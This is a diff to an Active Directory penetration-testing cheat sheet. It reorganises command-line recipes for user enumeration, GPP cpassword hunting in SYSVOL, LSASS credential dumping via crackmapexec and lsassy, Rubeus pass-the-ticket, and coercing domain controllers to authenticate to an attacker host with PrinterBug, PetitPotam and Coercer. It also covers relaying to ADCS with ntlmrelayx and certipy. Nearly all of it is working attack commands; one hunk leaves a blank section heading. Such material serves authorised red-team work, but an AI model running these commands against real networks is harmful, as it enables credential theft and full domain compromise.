@@ -128,7 +128,7 @@
    * ADSI
       * `([adsisearcher]"objectCategory=User").Findall() | ForEach {$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt`
    * BloodHound
-      * `cat users.json | jq | grep email | cut -d '"' -f 4 | sort -u > users.txt`
+      * `cat users.json | jq | grep samaccountname | cut -d '"' -f 4 | sort -u > users.txt`
    * Impacket
       * `GetADUsers.py <domain>/<user>:<pass> [-dc-ip <ip>]`
 * Password Policy
@@ -221,7 +221,7 @@
    * `crackmapexec smb <ip_subnet> -u <user> -p <pass> -M lsassy`
 
 
-## GPPPassword
+##  
 * CLI
   * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
 * Impacket
@@ -328,9 +328,7 @@
 * Monitor host with Unconstrained Delegation
    * Open cmd as admin
    * `Rubeus.exe monitor /interval:5 /filteruser:DC01$`
-* PrinterBug
-   * `SpoolSample.exe <DC> <ATTACKER>`
-   * The coerced authentication probably worked!
+* Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
 * Pass-the-Ticket
    * `cat ticket.txt | tr -d '\n' | tr -d ' '`
    * `Rubeus.exe ptt /ticket:<ticket>`
@@ -737,17 +735,22 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * Patched as of November 9th, 2021
 
 
-## PetitPotam
-
-* https://github.com/topotam/PetitPotam
-* `PetitPotam.py -d <domain> -u <user> -p <pass> <ATTACKER> <DC>`
-* The unauthenticated variant is fixed as of Aug 10, 2021. The authenticated variant won't be fixed.
-
-
 ## Coercer
 * https://github.com/p0dalirius/Coercer
 * `sudo python3 -m pip install coercer`
-* `Coercer -d <domain> -u <user> -p <pass> --listener <ATTACKER> --target <DC>`
+* `Coercer coerce -l <attacker> -t <dc> -d <domain> -u <user> -p <pass>`
+
+
+## PetitPotam
+
+* https://github.com/topotam/PetitPotam
+* `PetitPotam.py -d <domain> -u <user> -p <pass> <attacker> <dc>`
+* The unauthenticated variant is fixed as of Aug 10, 2021. The authenticated variant won't be fixed.
+
+
+## PrinterBug
+* https://github.com/leechristensen/SpoolSample
+* `SpoolSample.exe <dc> <attacker>`
 
 
 ## ADCS
@@ -785,9 +788,6 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * Example:
    * `ntlmrelayx -t "http://<ca-server>/certsrv/certfnsh.asp" --adcs --template <template>`
    * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
-      * PrinterBug: `SpoolSample.exe <DC> <ATTACKER>`
-      * PetitPotam: `PetitPotam.py -d <domain> -u <user> -p <pass> <ATTACKER> <DC>`
-      * Coercer: `Coercer -d <domain> -u <user> -p <pass> --listener <ATTACKER> --target <DC>`
 * Notes
    * In some cases, domain computers are allowed to request certificates (instead of domain users). If the "ms-ds-MachineAccountQuota" is set to > 1, it is possible to create a computer account yourself with PowerMad or SharpMad. Then you can request a TGT for this machine account using Rubeus. And then request a certificate with an altname (so a Domain Admin) using Certify.
    * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<password>' -AsPlainText -Force)`
@@ -817,8 +817,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
     * `certipy find -u <user> -p <pass> -dc-ip <ip> -vulnerable`
   * Start relay
     * `certipy relay -ca <ca-server>`
-  * Coerce authentication
-    * `PetitPotam.py -d <domain> -u <user> -p <pass> <ATTACKER> <DC>`
+  * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
   * Authenticate (dumps NT hash and TGT)
     * `certipy auth -pfx <dc>.pfx -dc-ip <ip>`
 
